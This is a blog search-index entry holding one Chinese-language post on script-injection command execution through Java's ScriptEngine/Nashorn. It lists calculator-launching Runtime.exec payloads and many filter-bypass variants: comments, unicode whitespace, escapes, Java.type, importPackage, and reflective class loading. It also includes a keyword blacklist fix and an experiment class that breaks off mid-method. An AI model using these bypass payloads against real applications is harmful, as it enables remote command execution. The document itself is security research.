<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>java中js命令执行与绕过</title>
    <link href="/2024/08/15/java%E4%B8%ADjs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <url>/2024/08/15/java%E4%B8%ADjs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞原因"><a href="#0x01-漏洞原因" class="headerlink" title="0x01 漏洞原因"></a>0x01 漏洞原因</h3><p>​java中<code>javax.script.ScriptEngine</code> 类来解析js并执行js代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).eval(test);<br></code></pre></td></tr></table></figure><p>因为scriptEngine的相关特性，可以执行java代码，所以当我们把test替换为如下代码，就可以命令执行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;</span>open -a calculator<span class="hljs-string">&quot;)&#125;;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x02-基本payload"><a href="#0x02-基本payload" class="headerlink" title="0x02  基本payload"></a>0x02  基本payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;</span>calc<span class="hljs-string">&quot;)&#125;;&quot;</span>;<br>String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=new java.lang.ProcessBuilder; x.command(\&quot;calc\&quot;); x.start();return true;&#125;;&quot;</span>;<br><span class="hljs-comment">// 套娃</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">taowa</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; new javax.script.ScriptEngineManager().getEngineByName(\&quot;js\&quot;).eval(\&quot;var a = test(); function test() &#123; var x=java.lang.\&quot;+\&quot;Runtime.getRuntime().exec(\\\&quot;open -a Calculator\\\&quot;);&#125;;\&quot;); &#125;;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x03-垃圾字符payload"><a href="#0x03-垃圾字符payload" class="headerlink" title="0x03 垃圾字符payload"></a>0x03 垃圾字符payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 拼接        </span><br>String test51=<span class="hljs-string">&quot;var JavaTest= Java.type(\&quot;java.lang\&quot;+\&quot;.Runtime\&quot;); var b =JavaTest.getRuntime(); b.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><span class="hljs-comment">// **截断</span><br>        String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang./**/Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br><span class="hljs-comment">// 空格截断</span><br>        String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.  Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br><br></code></pre></td></tr></table></figure><h3 id="0x04-编码与反射"><a href="#0x04-编码与反射" class="headerlink" title="0x04  编码与反射"></a>0x04  编码与反射</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">test53</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u002E\u0067\u0065\u0074\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u0028\u0029\u002E\u0065\u0078\u0065\u0063(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><br><span class="hljs-type">String</span> <span class="hljs-variable">test55</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var clazz = java.security.SecureClassLoader.class;\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var method = clazz.getSuperclass().getDeclaredMethod(&#x27;defineClass&#x27;, &#x27;anything&#x27;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        method.setAccessible(true);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var classBytes = &#x27;&quot;</span>+b64byte+<span class="hljs-string">&quot;&#x27;;&quot;</span> +<br>        <span class="hljs-string">&quot;        var bytes = java.util.Base64.getDecoder().decode(classBytes);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var constructor = clazz.getDeclaredConstructor();\n&quot;</span> +<br>        <span class="hljs-string">&quot;        constructor.setAccessible(true);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var clz = method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);\nprint(clz);&quot;</span> +<br>        <span class="hljs-string">&quot;        clz.newInstance();&quot;</span>;<br><br></code></pre></td></tr></table></figure><h3 id="0x05-特性绕过"><a href="#0x05-特性绕过" class="headerlink" title="0x05 特性绕过"></a>0x05 特性绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">//使用特有的Java对象的type()方法导入类，轻松绕过</span><br>        String test51=<span class="hljs-string">&quot;var JavaTest= Java.type(\&quot;java.lang\&quot;+\&quot;.Runtime\&quot;); var b =JavaTest.getRuntime(); b.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><span class="hljs-comment">//兼容Rhino功能，又有了两种新的绕过方式。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test52</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;load(\&quot;nashorn:mozilla_compat.js\&quot;); importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br>        String test54=<span class="hljs-string">&quot;var importer =JavaImporter(java.lang); with(importer)&#123; var x=Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x06-unicode换行符"><a href="#0x06-unicode换行符" class="headerlink" title="0x06 unicode换行符"></a>0x06 unicode换行符</h3><p>既然Nashorn是一个解析引擎,那么他一定有词法分析器.(<strong>感叹编译原理没有白学</strong>)。于是我下载了源码，开始对源码进行分析。我在<code>jdk.nashorn.internal.parser</code>包下面发现了<code>Lexer</code>类。类中有几个函数是用来判断<code>js空格</code>和<code>js换行符</code> 的，其中主要的三个字符串如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LFCR</span>     <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\n\r&quot;</span>; <span class="hljs-comment">// line feed and carriage return (ctrl-m) </span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">JAVASCRIPT_WHITESPACE_EOL</span> <span class="hljs-operator">=</span><br>    LFCR +<br>    <span class="hljs-string">&quot;\u2028&quot;</span> + <span class="hljs-comment">// line separator</span><br>    <span class="hljs-string">&quot;\u2029&quot;</span>   <span class="hljs-comment">// paragraph separator</span><br>    ;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">JAVASCRIPT_WHITESPACE</span> <span class="hljs-operator">=</span><br>    SPACETAB +<br>    JAVASCRIPT_WHITESPACE_EOL +<br>    <span class="hljs-string">&quot;\u000b&quot;</span> + <span class="hljs-comment">// tabulation line</span><br>    <span class="hljs-string">&quot;\u000c&quot;</span> + <span class="hljs-comment">// ff (ctrl-l)</span><br>    <span class="hljs-string">&quot;\u00a0&quot;</span> + <span class="hljs-comment">// Latin-1 space</span><br>    <span class="hljs-string">&quot;\u1680&quot;</span> + <span class="hljs-comment">// Ogham space mark</span><br>    <span class="hljs-string">&quot;\u180e&quot;</span> + <span class="hljs-comment">// separator, Mongolian vowel</span><br>    <span class="hljs-string">&quot;\u2000&quot;</span> + <span class="hljs-comment">// en quad</span><br>    <span class="hljs-string">&quot;\u2001&quot;</span> + <span class="hljs-comment">// em quad</span><br>    <span class="hljs-string">&quot;\u2002&quot;</span> + <span class="hljs-comment">// en space</span><br>    <span class="hljs-string">&quot;\u2003&quot;</span> + <span class="hljs-comment">// em space</span><br>    <span class="hljs-string">&quot;\u2004&quot;</span> + <span class="hljs-comment">// three-per-em space</span><br>    <span class="hljs-string">&quot;\u2005&quot;</span> + <span class="hljs-comment">// four-per-em space</span><br>    <span class="hljs-string">&quot;\u2006&quot;</span> + <span class="hljs-comment">// six-per-em space</span><br>    <span class="hljs-string">&quot;\u2007&quot;</span> + <span class="hljs-comment">// figure space</span><br>    <span class="hljs-string">&quot;\u2008&quot;</span> + <span class="hljs-comment">// punctuation space</span><br>    <span class="hljs-string">&quot;\u2009&quot;</span> + <span class="hljs-comment">// thin space</span><br>    <span class="hljs-string">&quot;\u200a&quot;</span> + <span class="hljs-comment">// hair space</span><br>    <span class="hljs-string">&quot;\u202f&quot;</span> + <span class="hljs-comment">// narrow no-break space</span><br>    <span class="hljs-string">&quot;\u205f&quot;</span> + <span class="hljs-comment">// medium mathematical space</span><br>    <span class="hljs-string">&quot;\u3000&quot;</span> + <span class="hljs-comment">// ideographic space</span><br>    <span class="hljs-string">&quot;\ufeff&quot;</span>   <span class="hljs-comment">// byte order mark</span><br>    ;<br></code></pre></td></tr></table></figure><p>很显然到这里我们已经获取了非常多的可以替换空格和换行符的unicode码。于是我就简单尝试了一下绕过。在尝试过程中发现部分也是可以被检测出来的，而另外一部分不起作用。<strong>我猜想是js和java的处理这些字符的逻辑不同导致的</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String test62=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.\u2029lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;;&quot;</span>;<br><br></code></pre></td></tr></table></figure><p><code>skipComments</code>函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">skipComments</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// Save the current position.</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> position;<br><br>        <span class="hljs-keyword">if</span> (ch0 == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>            <span class="hljs-comment">// Is it a // comment.</span><br>            <span class="hljs-keyword">if</span> (ch1 == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>                <span class="hljs-comment">// Skip over //.</span><br>                skip(<span class="hljs-number">2</span>);<br>                <span class="hljs-comment">// Scan for EOL.</span><br>                <span class="hljs-keyword">while</span> (!atEOF() &amp;amp;&amp;amp; !isEOL(ch0)) &#123;<br>                    skip(<span class="hljs-number">1</span>);<br>                &#125;<br>                <span class="hljs-comment">// Did detect a comment.</span><br>                add(COMMENT, start);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch1 == <span class="hljs-string">&#x27;*&#x27;</span>) &#123;<br>                <span class="hljs-comment">// Skip over /*.</span><br>                skip(<span class="hljs-number">2</span>);<br>                <span class="hljs-comment">// Scan for */.</span><br>                <span class="hljs-keyword">while</span> (!atEOF() &amp;amp;&amp;amp; !(ch0 == <span class="hljs-string">&#x27;*&#x27;</span> &amp;amp;&amp;amp; ch1 == <span class="hljs-string">&#x27;/&#x27;</span>)) &#123;<br>                    <span class="hljs-comment">// If end of line handle else skip character.</span><br>                    <span class="hljs-keyword">if</span> (isEOL(ch0)) &#123;<br>                        skipEOL(<span class="hljs-literal">true</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        skip(<span class="hljs-number">1</span>);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (atEOF()) &#123;<br>                    <span class="hljs-comment">// TODO - Report closing */ missing in parser.</span><br>                    add(ERROR, start);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// Skip */.</span><br>                    skip(<span class="hljs-number">2</span>);<br>                &#125;<br><br>                <span class="hljs-comment">// Did detect a comment.</span><br>                add(COMMENT, start);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch0 == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>            <span class="hljs-keyword">assert</span> scripting;<br>            <span class="hljs-comment">// shell style comment</span><br>            <span class="hljs-comment">// Skip over #.</span><br>            skip(<span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// Scan for EOL.</span><br>            <span class="hljs-keyword">while</span> (!atEOF() &amp;amp;&amp;amp; !isEOL(ch0)) &#123;<br>                skip(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-comment">// Did detect a comment.</span><br>            add(COMMENT, start);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Not a comment.</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>从上面的代码可以看出来，当遇到以<code>/</code>开头的就会检测第二个是不是<code>/</code>如果是的话就回去找<code>EOF换行符</code>，而这些<code>//......EOF</code>之间的内容都会被当做注释绕过的。<br>那么当我们的代码是如下的样子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">String test61=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.lang.//\nRuntime.getRuntime().exec(\&quot;calc\&quot;);&#125;;&quot;</span>;<br><br>        String test61=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.lang./**/Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>因为我们的正则不严谨，用于匹配的字符串为<code>var test = mainOutput(); function mainOutput() &#123; var x=java.lang.</code>而被解析后的代码为<code>var test = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;;</code> 成功绕过了我们的检测。<br>上面的代码还有一个关于<code>#</code>的注释，但是一直没有尝试成功，猜测可能跟<code>assert scripting</code>这行代码有关。</p><h3 id="0x07-修复"><a href="#0x07-修复" class="headerlink" title="0x07 修复"></a>0x07 修复</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">KeywordCheckUtils7</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; blacklist = Sets.newHashSet(<br>            <span class="hljs-comment">// Java 全限定类名</span><br>            <span class="hljs-string">&quot;java.io.File&quot;</span>, <span class="hljs-string">&quot;java.io.RandomAccessFile&quot;</span>, <span class="hljs-string">&quot;java.io.FileInputStream&quot;</span>, <span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>,<br>            <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>, <span class="hljs-string">&quot;java.lang.Runtime&quot;</span>, <span class="hljs-string">&quot;java.lang.System&quot;</span>, <span class="hljs-string">&quot;System.getProperty&quot;</span>,<br>            <span class="hljs-string">&quot;java.lang.Thread&quot;</span>, <span class="hljs-string">&quot;java.lang.ThreadGroup&quot;</span>, <span class="hljs-string">&quot;java.lang.reflect.AccessibleObject&quot;</span>, <span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<br>            <span class="hljs-string">&quot;java.net.DatagramSocket&quot;</span>, <span class="hljs-string">&quot;java.net.DatagramSocket&quot;</span>, <span class="hljs-string">&quot;java.net.Socket&quot;</span>, <span class="hljs-string">&quot;java.net.ServerSocket&quot;</span>,<br>            <span class="hljs-string">&quot;java.net.MulticastSocket&quot;</span>, <span class="hljs-string">&quot;java.net.MulticastSocket&quot;</span>, <span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;java.net.HttpURLConnection&quot;</span>,<br>            <span class="hljs-string">&quot;java.security.AccessControlContext&quot;</span>, <span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<br>            <span class="hljs-comment">//反射关键字</span><br>            <span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-string">&quot;newinstance&quot;</span>,<br>            <span class="hljs-comment">// JavaScript 方法</span><br>            <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;new function&quot;</span>,<br>            <span class="hljs-comment">//引擎特性</span><br>            <span class="hljs-string">&quot;Java.type&quot;</span>,<span class="hljs-string">&quot;importPackage&quot;</span>,<span class="hljs-string">&quot;importClass&quot;</span>,<span class="hljs-string">&quot;JavaImporter&quot;</span><br>            );<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">KeywordCheckUtils7</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 空构造方法</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkInsecureKeyword</span><span class="hljs-params">(String code)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 去除注释</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">removeComment</span> <span class="hljs-operator">=</span> StringUtils.replacePattern(code, <span class="hljs-string">&quot;(?:/\\*(?:[^*]|(?:\\*+[^*/]))*\\*+/)|(?://.*[\n\r\u2029\u2028])&quot;</span>, <span class="hljs-string">&quot; &quot;</span>);<br>        <span class="hljs-comment">//去除特殊字符</span><br>        removeComment =StringUtils.replacePattern(removeComment,<span class="hljs-string">&quot;[\u2028\u2029\u00a0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\ufeff]&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">// 去除空格</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">removeWhitespace</span> <span class="hljs-operator">=</span> StringUtils.replacePattern(removeComment, <span class="hljs-string">&quot;\\s+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">// 多个空格替换为一个</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">oneWhiteSpace</span> <span class="hljs-operator">=</span> StringUtils.replacePattern(removeComment, <span class="hljs-string">&quot;\\s+&quot;</span>, <span class="hljs-string">&quot; &quot;</span>);<br>        System.out.println(removeWhitespace);<br>        System.out.println(oneWhiteSpace);<br>        Set&lt;String&gt; insecure = blacklist.stream().filter(s -&gt; StringUtils.containsIgnoreCase(removeWhitespace, s) ||<br>                StringUtils.containsIgnoreCase(oneWhiteSpace, s)).collect(Collectors.toSet());<br><br>        <span class="hljs-keyword">if</span> (!CollectionUtils.isEmpty(insecure)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;存在不安全的关键字:&quot;</span>+insecure);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;存在安全问题&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>(<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> manager.getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);<br>            engine.eval(code);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x08-实验"><a href="#0x08-实验" class="headerlink" title="0x08 实验"></a>0x08 实验</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">h2client</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String b64byte=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// classloader</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test55</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var clazz = java.security.SecureClassLoader.class;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var method = clazz.getSuperclass().getDeclaredMethod(&#x27;defineClass&#x27;, &#x27;anything&#x27;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        method.setAccessible(true);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var classBytes = &#x27;&quot;</span>+b64byte+<span class="hljs-string">&quot;&#x27;;&quot;</span> +<br>                <span class="hljs-string">&quot;        var bytes = java.util.Base64.getDecoder().decode(classBytes);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var constructor = clazz.getDeclaredConstructor();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        constructor.setAccessible(true);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var clz = method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);\nprint(clz);&quot;</span> +<br>                <span class="hljs-string">&quot;        clz.newInstance();&quot;</span>;<br><br>        <span class="hljs-comment">//使用特有的Java对象的type()方法导入类，轻松绕过</span><br>        String test51=<span class="hljs-string">&quot;var JavaTest= Java.type(\&quot;java.lang\&quot;+\&quot;.Runtime\&quot;); var b =JavaTest.getRuntime(); b.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><span class="hljs-comment">//兼容Rhino功能，又有了两种新的绕过方式。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test52</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;load(\&quot;nashorn:mozilla_compat.js\&quot;); importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br>        String test54=<span class="hljs-string">&quot;var importer =JavaImporter(java.lang); with(importer)&#123; var x=Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">test53</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u002E\u0067\u0065\u0074\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u0028\u0029\u002E\u0065\u0078\u0065\u0063(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">taowa</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; new javax.script.ScriptEngineManager().getEngineByName(\&quot;js\&quot;).eval(\&quot;var a = test(); function test() &#123; var x=java.lang.\&quot;+\&quot;Runtime.getRuntime().exec(\\\&quot;open -a Calculator\\\&quot;);&#125;;\&quot;); &#125;;&quot;</span>;<br><br>        String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.  Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br>        String test62=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.\u000blang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br>        String test61=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.lang./Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br><br><br>        